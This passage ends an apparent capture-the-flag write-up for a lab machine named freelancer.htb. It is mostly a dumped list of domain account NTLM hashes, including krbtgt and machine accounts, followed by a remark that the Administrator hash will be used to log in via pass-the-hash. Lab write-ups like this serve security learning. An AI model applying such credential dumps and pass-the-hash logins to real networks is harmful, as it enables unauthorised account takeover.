Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
YOVECIO$:11603:aad3b435b51404eeaad3b435b51404ee:71ddafa4193caa4376aae61bcfeaf9d5:::
[*] Cleaning up...
```

Now we can use the Adminstrator's NTLM hash to login and grab the last flag!

![ca3f25d14492bb259e8dc0bc78cbd412.png](../../../_resources/ca3f25d14492bb259e8dc0bc78cbd412.png)

&nbsp;